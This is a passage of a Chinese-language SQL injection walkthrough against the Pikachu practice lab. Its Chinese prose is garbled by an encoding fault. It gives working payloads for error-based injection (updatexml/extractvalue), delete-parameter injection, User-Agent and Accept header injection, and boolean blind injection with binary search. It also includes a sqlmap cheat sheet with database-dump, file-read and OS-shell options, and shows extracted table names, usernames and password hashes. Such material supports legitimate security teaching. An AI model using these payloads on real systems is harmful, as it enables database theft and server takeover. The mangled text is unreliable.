****å¼ºåˆ¶ MySQL æ‰§è¡Œ **`**updatexml()**`**ï¼Œä»è€Œè§¦å‘å¯æ§æŠ¥é”™å›æ˜¾æ•°æ®ã€‚  **
>



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051631606.png)



è¿˜å¯ä»¥æ„é€ çš„ç®€æ´ä¸€äº›ï¼š

`<font style="color:rgb(51, 51, 51);">' or updatexml(1,concat(0x7e,(select database())),1),1) -- q</font>` 

ç­‰ä»·çš„ï¼š`<font style="color:rgb(51, 51, 51);">' or updatexml(1,concat(0x7e,(select database())),1),1) -- </font>`

`<font style="color:rgb(51, 51, 51);">' or updatexml(1,concat(0x7e,(select database())),1),1) --+</font>`  

`<font style="color:rgb(51, 51, 51);">' or updatexml(1,concat(0x7e,(select database())),1),1)#</font>` 

`' or updatexml(1,concat(0x7e,database()),1),1)#`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051625293.png)



å¦ä¸€ç§ï¼š`<font style="color:rgb(51, 51, 51);">' or updatexml(1,concat(0x7e,(select database())),1)or'</font>`



> `<font style="color:rgb(51, 51, 51);">' or updatexml(1,concat(0x7e,(select database())),1)or'</font>`
>
> **<font style="color:rgb(51, 51, 51);">ç¬¬äºŒä¸ª or:</font>**
>
> SELECT * FROM users 
>
> WHERE username = ''
>
> OR updatexml(1,concat(0x7e,(select database())),1)
>
> OR '';
>



**(1) æ‰€ä»¥ç¬¬äºŒä¸ª **`**or**`** çš„çœŸå®èº«ä»½æ˜¯ï¼Ÿ**

ğŸ‘‰ **â€œè¯­æ³•ç¼“å†²å«â€ / â€œå…œåº•è¿æ¥ç¬¦â€**

å®ƒçš„èŒè´£åªæœ‰è¿™å‡ ä¸ªï¼š

| ä½œç”¨ | è¯´æ˜ |
| --- | --- |
| é—­åˆå¼•å· | æŠŠåé¢çš„ `'`<br/> åˆæ³•åƒæ‰ |
| é˜²æ­¢ SQL æŠ¥é”™ | ä¸è®©è§£æåœ¨å¼•å·å¤„ä¸­æ–­ |
| ä¸å½±å“æ‰§è¡Œ | é€»è¾‘çœŸå‡æ— æ‰€è°“ |
| æé«˜é€šç”¨æ€§ | ä¸ç”¨ç²¾ç¡®çŒœåé¢ SQL ç»“æ„ |


---

**(2) ä¸ºä»€ä¹ˆä¸ç”¨ **`**--+**`** ç›´æ¥æ³¨é‡Šï¼Ÿ**

ä½ å¯èƒ½ä¼šé—®ï¼š

é‚£æˆ‘ç”¨ `--+` ä¸å°±è¡Œäº†ï¼Ÿ

âœ” å¯ä»¥ï¼Œä½†ï¼š

| `--+` | `or ''` |
| --- | --- |
| ä¾èµ–æ³¨é‡Šç¯å¢ƒ | ä¸éœ€è¦æ³¨é‡Š |
| å¯èƒ½è¢« WAF æ‹¦ | é€šå¸¸ä¸è¿‡æ»¤ |
| éœ€è¦ç©ºæ ¼ | `--`<br/> åå¿…é¡»ç©ºæ ¼ |
| ä¸é€‚ç”¨äºæ‰€æœ‰åœºæ™¯ | æ›´é€šç”¨ |


ğŸ‘‰ `**or ''**`** æ˜¯â€œæ— æ³¨é‡Šå‹æ³¨å…¥â€å¸¸ç”¨æŠ€å·§**

****



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051619706.png)



`<font style="color:rgb(51, 51, 51);">' and extractvalue(1,concat(0x7e,(select database())))and'</font>`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051629162.png)





#### 2ï¼‰ æ¥ä¸‹æ¥æŸ¥è¡¨åï¼š
`<font style="color:rgb(51, 51, 51);">' or updatexml(1,concat(0x7e,(select database())),1)or'</font>`

`select group_concat(table_name) from information_schema.tables where table_schema='pikachu'`

ä¿©è€…ç»“åˆ ->  `**<font style="color:rgb(51, 51, 51);">' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='pikachu')),1)or'</font>**`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051635861.png)

æ˜¾ç¤ºä¸å…¨ï¼Œå¯ä»¥ä½¿ç”¨**åˆ†æ®µæ˜¾ç¤ºï¼ˆæ­¤å¤„ä½¿ç”¨çš„æ˜¯ï¼šleft,mid,rightï¼‰**ï¼Œå†å°†ä¿¡æ¯æ‹¼æ¥

`**<font style="color:rgb(51, 51, 51);">' or updatexml(1,concat(0x7e,right((select group_concat(table_name) from information_schema.tables where table_schema='pikachu'),30),0x7e),3)or'</font>**`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051631589.png)



è¿™æ ·å°±å¾—åˆ°äº†å®Œæ•´çš„è¡¨åï¼š

<font style="color:rgb(0, 0, 0);">XPATH syntax error: '~httpinfo,member,message,users,x'</font>

<font style="color:rgb(0, 0, 0);">XPATH syntax error: '~,member,message,users,xssblind~'</font>

-> `<font style="color:rgb(0, 0, 0);">httpinfo,member,message,users,xssblind</font>`



è¿˜å¯ä»¥ç”¨`limit`å‡½æ•°é€ä¸ªè¯»å–æ•°æ®åº“ä¸­çš„è¡¨å

`' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' **limit 0,1**),0x7e),3)or'`

è¿”å›ï¼š<font style="color:rgb(0, 0, 0);">XPATH syntax error: '~httpinfo~'</font>

`<font style="color:rgb(0, 0, 0);">' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' </font>**<font style="color:rgb(0, 0, 0);">limit 2,1</font>**<font style="color:rgb(0, 0, 0);">),0x7e),3)or'</font>`

<font style="color:rgb(0, 0, 0);">è¿”å›ï¼š XPATH syntax error: '~member~'</font>

`<font style="color:rgb(0, 0, 0);">' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' </font>**<font style="color:rgb(0, 0, 0);">limit 3,1</font>**<font style="color:rgb(0, 0, 0);">),0x7e),3)or'</font>`

<font style="color:rgb(0, 0, 0);">è¿”å›ï¼š XPATH syntax error: '~users~'</font>

<font style="color:rgb(0, 0, 0);"></font>

#### <font style="color:rgb(0, 0, 0);">3ï¼‰æŸ¥å­—æ®µå</font>
<font style="color:rgb(0, 0, 0);">ä¹Ÿéœ€è¦åˆ†æ®µæŸ¥è¯¢ï¼š</font>

`**<font style="color:rgb(51, 51, 51);">' or updatexml(1,concat(0x7e,(</font>****<font style="color:rgb(0, 0, 0);">select group_concat(column_name) from information_schema.columns where table_name='users'</font>****<font style="color:rgb(51, 51, 51);">),0x7e),3)or'</font>**`

`**<font style="color:rgb(51, 51, 51);">' or updatexml(1,concat(0x7e,right((</font>****<font style="color:rgb(0, 0, 0);">select group_concat(column_name) from information_schema.columns where table_name='users'</font>****<font style="color:rgb(51, 51, 51);">),30),0x7e),3)or'</font>**`

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);">XPATH syntax error: '~id,username,password,level,id,u'</font>

<font style="color:rgb(0, 0, 0);">XPATH syntax error: '~vel,id,username,password,level~'</font>

<font style="color:rgb(0, 0, 0);">å®Œæ•´çš„è¡¨åï¼šid,username,password,level,id,username,password,level</font>

<font style="color:rgb(0, 0, 0);"></font>

#### <font style="color:rgb(0, 0, 0);">4ï¼‰è¯»å–å­—æ®µ</font>
`**<font style="color:rgb(51, 51, 51);">' or updatexml(1,concat(0x7e,(</font>****<font style="color:rgb(0, 0, 0);">select group_concat(username) from users</font>****<font style="color:rgb(51, 51, 51);">),0x7e),3)or'</font>**`

è¿”å›ï¼š<font style="color:rgb(0, 0, 0);">XPATH syntax error: '~admin,pikachu,test~'</font>



å†…å®¹è¿‡å¤šçš„æ—¶å€™ä¸è¦å¿˜è®°åˆ†æ®µè¯»å–ï¼š

`**<font style="color:rgb(51, 51, 51);">' or updatexml(1,concat(0x7e,(</font>****<font style="color:rgb(0, 0, 0);">select password from users limit 0,1</font>****<font style="color:rgb(51, 51, 51);">),0x7e),3)or'</font>**`

è¿”å›ï¼š    <font style="color:rgb(0, 0, 0);">XPATH syntax error: '~e10adc3949ba59abbe56e057f20f883'</font>

<font style="color:rgb(0, 0, 0);"> XPATH syntax error: '~670b14728ad9902aecba32e22fa4f6b'</font>

<font style="color:rgb(0, 0, 0);"> XPATH syntax error: '~e99a18c428cb38d5f260853678922e0'</font>

<font style="color:rgb(0, 0, 0);"></font>

<font style="color:rgb(0, 0, 0);"></font>

## 4.6 delete æ³¨å…¥
æç¤ºï¼š**åˆ é™¤ç•™è¨€çš„çš„æ—¶å€™,å¥½åƒæœ‰ç‚¹é—®é¢˜**

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051627433.png)



è¿˜æ˜¯æŠ“åŒ…ï¼š

å‘ç°åˆ é™¤æ“ä½œæ—¶æœ‰ä¸€ä¸ª id 

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051617325.png)



å¯¹è¿™ä¸ª id è¿›è¡Œæµ‹è¯•ï¼š

æœ‰æ³¨å…¥ç‚¹

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051624519.png)



æŠ¥é”™æ³¨å…¥ï¼š`1%20and%20updatexml(1,concat(0x7e,database(),0x7e),3)`



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051627214.png)



ä¹‹åå°±ä¸è¿›è¡Œæ¼”ç¤ºäº†ã€‚

ï¼ˆæ³¨æ„ç©ºæ ¼è¿›è¡Œç¼–ç ï¼Œå¦åˆ™ä¸èƒ½æ‰§è¡Œï¼‰

```plsql
1%20and%20updatexml(1,concat(0x7e,database(),0x7e),3)

1%20and%20updatexml(1,concat(0x7e,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema='pikachu')),1)

1%20and%20updatexml(1,concat(0x7e,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='users'),0x7e),3)

1%20and%20updatexml(1,concat(0x7e,(select%20group_concat(username)%20from%20users),0x7e),3)

1%20and%20updatexml(1,concat(0x7e,(select%20password%20from%20users%20limit%200,1),0x7e),3)
```



## 4.7 "http header" æ³¨å…¥




æç¤ºç»™äº†è´¦å·å’Œå¯†ç ï¼šadmin/123456

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051615688.png)



ç™»å½•ä¹‹åï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051621340.png)

çœ‹çœ‹è¿”å›çš„ä¿¡æ¯æœ‰ä»€ä¹ˆï¼š

```plain
ä½ çš„ipåœ°å€:127.0.0.1

ä½ çš„user agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36

ä½ çš„http accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

ä½ çš„ç«¯å£ï¼ˆæœ¬æ¬¡è¿æ¥ï¼‰:tcp62643
```



**<font style="color:rgb(51, 51, 51);">é¡µé¢è¿”å›ä¿¡æ¯æœ‰ user agent ã€http accept æ•°æ®ï¼Œè¯´æ˜å°† http å¤´ä¸­çš„ user-agent å’Œ accept å¸¦å…¥äº† SQL æŸ¥è¯¢ï¼Œ</font>**



æŠ“åŒ…ç™»å½•é¡µé¢ï¼Œä¸€å…±ä¿©ä¸ªæ•°æ®åŒ…ï¼š



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051635182.png)



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051634455.png)



ç”¨ç¬¬äºŒä¸ªæ•°æ®åŒ…æµ‹è¯•ï¼š

`User-Agent: '`

æŠ¥é”™ï¼š`<font style="color:rgb(0, 0, 0);">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,imag' at line 1</font>`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051622661.png)



ç›´æ¥ç”¨æŠ¥é”™æ³¨å…¥å§ï¼šä¿©å¤„æ³¨å…¥ç‚¹

`User-Agent: ' or updatexml(1,concat(0x7e,(select database())),1)or'`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051617627.png)

`Accept: ' or updatexml(1,concat(0x7e,(select database())),1)or'`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051622419.png)





## 4.8 åŸºäº boolian çš„ç›²æ³¨


å½“åº”ç”¨å±‚**ä¸è¿”å›ä»»ä½•æŸ¥è¯¢ç»“æœ**ï¼Œä¹Ÿ**ä¸å›æ˜¾æ•°æ®åº“é”™è¯¯**æ—¶ï¼Œæ”»å‡»è€…åªèƒ½é€šè¿‡â€œä¾§ä¿¡é“â€åˆ¤æ–­ SQL æ¡ä»¶æ˜¯å¦æˆç«‹ï¼Œè¿™å°±å«**ç›²æ³¨**ã€‚

â€œç›²â€çš„ä¸æ˜¯æ•°æ®åº“ï¼Œç›²çš„æ˜¯æ”»å‡»è€…çš„è§†é‡ã€‚



å¸ƒå°”ç›²æ³¨å°±æ˜¯ï¼š

** é€šè¿‡æ„é€ çœŸå‡æ¡ä»¶ï¼Œè§‚å¯Ÿé¡µé¢è¡Œä¸ºå·®å¼‚ï¼Œé—´æ¥åˆ¤æ–­ SQL è¡¨è¾¾å¼æ˜¯å¦ä¸ºçœŸã€‚  **



ä»¥æœ¬å…³ä¸ºä¾‹ï¼š

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051624830.png)



æŸ¥è¯¢å¤±è´¥ï¼š

è¿”å›ï¼šæ‚¨è¾“å…¥çš„usernameä¸å­˜åœ¨ï¼Œè¯·é‡æ–°è¾“å…¥ï¼

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051619306.png)



æŸ¥è¯¢æˆåŠŸï¼š

è¿”å›å¯¹åº”çš„ä¿¡æ¯

your uid:1  
your email is: abc@pikachu.com

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051636857.png)





ä½†æ˜¯é™¤äº†è¿™ä¿©ç§è¿”å›ï¼Œå°±æ²¡æœ‰å…¶ä»–çš„æƒ…å†µäº†ã€‚æ‰€ä»¥è¦æƒ³åˆ¤æ–­æ˜¯å¦å­˜åœ¨ SQL æ³¨å…¥ï¼Œæˆ‘ä»¬ä½¿ç”¨ç›²æ³¨ã€‚åœ¨æœ¬å…³ä¸­åº”è¯¥ä½¿ç”¨å¸ƒå°”ç›²æ³¨ã€‚



### æ³¨å…¥è¿‡ç¨‹ï¼š
#### ï¼ˆ1ï¼‰åˆ¤æ–­å½“å‰æ•°æ®åº“çš„é•¿åº¦
`vince' and length(database())>5--+`  True

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051625786.png)



`vince' and length(database())>6--+` True

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051617778.png)



`vince' and length(database())>7--+` False

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051632664.png)



æ•°æ®åº“çš„é•¿åº¦**å¤§äº 6 ä¸å¤§äº 7**ï¼Œæ‰€ä»¥å¯ä»¥ç¡®å®š**æ•°æ®åº“çš„é•¿åº¦ä¸º 7**



#### ï¼ˆ2ï¼‰åˆ¤æ–­æ•°æ®åº“å
##### åˆ¤æ–­æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—æ¯ï¼š
`<font style="color:rgb(51, 51, 51);">vince' and (substr(database(),1,1))='a'--+</font>`<font style="color:rgb(51, 51, 51);">False</font>

`<font style="color:rgb(51, 51, 51);">vince' and (substr(database(),1,1))='b'--+</font>`<font style="color:rgb(51, 51, 51);">False</font>

<font style="color:rgb(51, 51, 51);">...</font>

`<font style="color:rgb(51, 51, 51);">vince' and (substr(database(),1,1))='p'--+</font>`<font style="color:rgb(51, 51, 51);">True</font>

> è¿™ç§æ‰‹å·¥æ³¨å…¥æ˜¾ç„¶è€—æ—¶è€—åŠ›ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨åé¢ä¼šä»‹ç»å·¥å…·ã€‚
>
> ä½†æ˜¯å¯¹äºåˆå­¦è€…æ¥è¯´ï¼Œç›²æ³¨çš„æµç¨‹è¿˜æ˜¯è¦**è‡ªå·±åŠ¨æ‰‹å®è·µ**çš„ï¼ï¼ï¼
>
> **äº†è§£ä¸€ä¸‹äºŒåˆ†æŸ¥æ‰¾ï¼Œå¯ä»¥å¤§å¤§æé«˜æˆ‘ä»¬æŸ¥æ‰¾çš„æ•ˆç‡ã€‚**
>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051628142.png)



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051628945.png)





##### åˆ¤æ–­æ•°æ®åº“åçš„ç¬¬äºŒä¸ªå­—æ¯ï¼š
> è¿™é‡Œä½¿ç”¨çš„æ˜¯äºŒåˆ†æŸ¥æ‰¾ã€‚
>

å‡è®¾æ•°æ®åº“åæ˜¯å°å†™å­—æ¯ï¼Œ`a~z` å¯¹åº”çš„ ASCII ç å°±æ˜¯ `97~122`



ç¬¬ä¸€æ¬¡äºŒåˆ†ï¼š

$ mid=\left\lfloor\frac{97+122}{2}\right\rfloor=109 $

`<font style="color:rgb(51, 51, 51);">vince' and ASCII(substr(database(),2,1)) > 109--+</font>`<font style="color:rgb(51, 51, 51);">False</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051622439.png)

<font style="color:rgb(51, 51, 51);"></font>

<font style="color:rgb(51, 51, 51);">ç¬¬äºŒæ¬¡äºŒåˆ†ï¼š</font>

$ mid=\left\lfloor\frac{97+108}{2}\right\rfloor=102 $

`<font style="color:rgb(51, 51, 51);">vince' and ASCII(substr(database(),2,1)) > 102--+</font>`<font style="color:rgb(51, 51, 51);">True</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051629303.png)



ç¬¬ä¸‰æ¬¡äºŒåˆ†ï¼š

$ mid=\left\lfloor\frac{103+108}{2}\right\rfloor=105 $

`<font style="color:rgb(51, 51, 51);">vince' and ASCII(substr(database(),2,1)) > 105--+</font>`<font style="color:rgb(51, 51, 51);"> False</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051628863.png)

ç¬¬å››æ¬¡äºŒåˆ†ï¼š

$ mid=\left\lfloor\frac{103+104}{2}\right\rfloor=103 $

`<font style="color:rgb(51, 51, 51);">vince' and ASCII(substr(database(),2,1)) > 103--+</font>`<font style="color:rgb(51, 51, 51);"> True</font>

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051625429.png)

ç¬¬äº”æ¬¡äºŒåˆ†ï¼š

$ mid=\left\lfloor\frac{104+105}{2}\right\rfloor=104 $

`<font style="color:rgb(51, 51, 51);">vince' and ASCII(substr(database(),2,1)) > 104--+</font>`<font style="color:rgb(51, 51, 51);"> True</font>

<font style="color:rgb(51, 51, 51);">åˆ°è¿™é‡Œä¸ºæ­¢æˆ‘ä»¬å°±å¯ä»¥</font>**<font style="color:rgb(51, 51, 51);">ç¡®è®¤æ•°æ®åº“çš„äºŒä¸ªå­—æ¯å°±æ˜¯ ASCII ç ä¸º 105 çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯ </font>**`**<font style="color:rgb(51, 51, 51);">i</font>**`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051629327.png)



97~122

>109 F  97~108

>102 T 103~108

>105 F 103~104

>103 T 104~105

>104 T **ASCII = 105**



##### ä¾æ­¤ç±»æ¨ï¼Œå°±å¯ä»¥å¾—åˆ°å®Œæ•´çš„æ•°æ®åº“åã€‚


#### ï¼ˆ3ï¼‰åˆ¤æ–­æ•°æ®åº“çš„è¡¨å
åˆ¤æ–­è¡¨åç¬¬ä¸€ä¸ªè¡¨çš„ç¬¬ä¸€ä¸ªå­—æ¯ï¼š

`vince' and (substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))='h'--+`

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051629123.png)



........





### å·¥å…·æ³¨å…¥â€”â€” sqlmap 


```plsql
è¿™é‡Œä»‹ç»ä¸‹sqlmapå¸¸ç”¨çš„ä¸€äº›è¯­æ³•

getå‹å¸¸ç”¨å‚æ•° 

-uï¼šæŒ‡å®šæ³¨å…¥çš„URL   sqlmap -u URL
--dbsï¼šçˆ†å‡ºæ‰€æœ‰æ•°æ®åº“ sqlmap -u URL --dbs
--dbmsï¼šæŒ‡å®šæ•°æ®åº“ç±»å‹ sqlmap -u URL --dbms=mysql
--usersï¼šæŸ¥çœ‹æ•°æ®åº“çš„æ‰€æœ‰ç”¨æˆ· sqlmap -u URL --users
--current-userï¼šæŸ¥çœ‹æ•°æ®åº“å½“å‰ç”¨æˆ· sqlmap -u URL --current-user
--current-dbï¼šæŸ¥çœ‹ç½‘ç«™å½“å‰æ•°æ®åº“ sqlmap -u URL --current-db
--is-dbaï¼šåˆ¤æ–­å½“å‰ç”¨æˆ·æ˜¯å¦æœ‰ç®¡ç†å‘˜æƒé™ sqlmap -u URL --is-dba
      [11:57:52] [INFO] testing if current user is DBA
    [11:57:52] [INFO] fetching current user
    current user is DBA: True
--rolesï¼šåˆ—å‡ºæ•°æ®åº“æ‰€æœ‰ç®¡ç†å‘˜è§’è‰²ï¼Œä»…é€‚ç”¨äºoracleæ•°æ®åº“ sqlmap -u URL --roles
--tablesï¼šçˆ†å‡ºæ‰€æœ‰æ•°æ®è¡¨ sqlmap -u URL -D æ•°æ®åº“å --tables
--columnsï¼šçˆ†å‡ºæ•°æ®åº“è¡¨æ‰€æœ‰åˆ— sqlmap -u URL -D æ•°æ®åº“å -T è¡¨å --columns 
--dumpï¼šçˆ†å‡ºæ•°æ®åº“ä¸­åˆ—ä¸­çš„æ‰€æœ‰æ•°æ® sqlmap -u URL -D æ•°æ®åº“å -T è¡¨å -C åˆ—å --dump
--dump-allï¼šçˆ†å‡ºæ•°æ®åº“ä¸­æ‰€æœ‰çš„æ•°æ® sqlmap -u URL -D æ•°æ®åº“å -T è¡¨å --dump-all
--sql-shellï¼šè·å–æ•°æ®åº“shell  sqlmap -u URL --sql-shell
--os-shellï¼šè·å–æœåŠ¡å™¨shell  sqlmap -u URL --os-shell
--file-readï¼šè¯»å–æœåŠ¡å™¨æ–‡ä»¶  sqlmap -u URL --file-read "æ–‡ä»¶è·¯å¾„åŠåç§°"
--file-write æœ¬åœ°æ–‡ä»¶ --file-dist ç›®æ ‡æ–‡ä»¶è·¯å¾„åŠåç§°ï¼šå°†æœ¬åœ°æ–‡ä»¶ä¸Šä¼ è‡³ç›®æ ‡æœåŠ¡å™¨
--time-sec=2ï¼šå»¶æ—¶æ³¨å…¥ sqlmap -u URL --time-sec=2
--batchï¼šæ¢æµ‹è¿‡ç¨‹ä¸­ä¸è¿›è¡Œè¯¢é—®ï¼Œä¸€å¾‹é€‰æ‹©é»˜è®¤
-mï¼šå¦‚æœæœ‰å¤šä¸ªurlåœ°å€ï¼Œå¯ä»¥æŠŠå¤šä¸ªurlä¿å­˜æˆä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œ-må¯ä»¥åŠ è½½æ–‡æœ¬æ–‡ä»¶é€ä¸ªæ‰«æ

postå‹å¸¸ç”¨å‚æ•° 

-rï¼šæŒ‡å®šPOSTæ•°æ®æ–‡ä»¶  sqlmap -r post.txt
--dataï¼šè¿™ç§ä¸éœ€è¦å°†æ•°æ®è¿›è¡Œä¿å­˜ï¼Œåªéœ€è¦å°†postæ•°æ®å¤åˆ¶ä¸‹æ¥å³å¯ sqlmap -u URL --data="postæ•°æ®"
--formsï¼šè‡ªåŠ¨æœç´¢è¡¨å•çš„æ–¹å¼ sqlmap -u URL --forms
--cookie="æŠ“å–çš„cookie"ï¼šæµ‹è¯•cookieå­—æ®µ
--param-delï¼šå‚æ•°æ‹†åˆ†å­—ç¬¦ï¼Œå½“GETå‹æˆ–POSTå‹éœ€è¦ç”¨å…¶ä»–å­—ç¬¦åˆ†å‰²æµ‹è¯•å‚æ•°çš„æ—¶å€™éœ€è¦ç”¨åˆ°æ­¤å‚æ•°ï¼Œsqlmap -r post.txt --data="query=foorbar;id=1" --param-del
--refererï¼šåœ¨è¯·æ±‚ä¸­ä¼ªé€ httpä¸­çš„refererï¼Œå½“levelå‚æ•°è®¾å®šä¸º3æˆ–è€…3ä»¥ä¸Šçš„æ—¶å€™ä¼šå°è¯•å¯¹refereræ³¨å…¥
--headersï¼šå¢åŠ é¢å¤–çš„httpå¤´
--proxyï¼šæŒ‡å®šä»£ç†åœ°å€
-pï¼šæŒ‡å®šæµ‹è¯•å‚æ•°

```





github åœ°å€ï¼š[https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)

å®‰è£…æ–¹æ³•ï¼š[https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md](https://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md)

ä½¿ç”¨ä¹‹å‰ï¼Œå…ˆæŠŠ** python ç¯å¢ƒ**å®‰è£…å¥½ï¼Œ

<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051621125.png)



<!-- è¿™æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œocr å†…å®¹ä¸ºï¼š -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202602051621757.png)





